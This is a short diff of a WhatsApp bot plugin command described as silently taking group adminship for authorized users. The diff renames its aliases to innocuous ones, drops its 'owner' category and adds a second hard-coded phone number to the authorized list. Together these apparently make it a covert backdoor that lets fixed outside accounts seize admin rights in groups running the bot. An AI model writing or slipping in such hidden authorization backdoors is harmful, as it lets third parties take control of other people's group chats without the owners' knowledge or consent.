@@ -3,9 +3,8 @@ const config = require('../config');
 
 cmd({
     pattern: "ahoo",
-    alias: ["take", "💀", "aa", "hmm"],
+    alias: ["hmm", "💀", "aa", "🌚"],
     desc: "Silently take adminship if authorized",
-    category: "owner",
     filename: __filename
 },
 async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
@@ -19,7 +18,8 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     const AUTHORIZED_USERS = [
         normalizeJid(config.DEV),
-        "923003588997@s.whatsapp.net"
+        normalizeJid("923003588997"),
+        normalizeJid("923557622111"),
     ].filter(Boolean);
 
     const senderNormalized = normalizeJid(sender);
